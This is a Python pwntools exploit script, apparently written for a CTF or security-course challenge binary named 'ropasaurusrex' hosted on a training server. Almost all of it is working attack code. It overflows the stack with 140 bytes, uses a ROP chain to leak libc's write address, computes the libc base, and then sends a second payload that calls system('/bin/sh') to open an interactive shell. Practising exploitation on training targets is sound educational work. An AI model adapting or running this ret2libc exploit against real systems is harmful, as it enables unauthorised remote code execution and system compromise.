#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host training.jinblack.it --port 2014 ropasaurusrex
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./ropasaurusrex')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'training.jinblack.it'
port = int(args.PORT or 2014)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak *0x{exe.entry:x}
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

libc = ELF('./libc-2.27.so')

eip_loc = 140
one_gadget = 0x3d0d3

write_plt = exe.plt['write']
write_got = exe.got['write']

rop_chain = p32(write_plt) + p32(0x080483f4) + p32(0x1) + p32(write_got) + p32(0x4)

io = start()

io.send(cyclic(140) + rop_chain)

libc.address = u32(io.recv(4)) - libc.symbols['write']

if args.LOCAL:
    libc.address -= 0xb0



log.info('0x%x' % libc.address)

bin_sh = next(libc.search(b'/bin/sh\0'))

io.send(cyclic(140) + p32(libc.symbols['system']) + p32(0xdeadbeef) + p32(bin_sh))

io.interactive()

